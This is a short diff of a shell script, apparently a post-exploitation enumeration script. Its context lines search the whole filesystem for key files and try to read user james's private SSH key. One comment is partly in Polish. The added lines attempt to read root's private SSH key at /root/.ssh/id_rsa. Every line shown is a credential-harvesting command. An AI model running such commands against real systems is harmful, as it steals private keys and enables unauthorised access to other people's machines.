@@ -24,3 +24,6 @@ find / -name "*.key" 2>/dev/null
 #    We might not have access to read it, but warto spróbować.
 ls -la /home/james/.ssh/ 2>/dev/null
 cat /home/james/.ssh/id_rsa 2>/dev/null
+
+# Attempt to read the root's private SSH key
+cat /root/.ssh/id_rsa
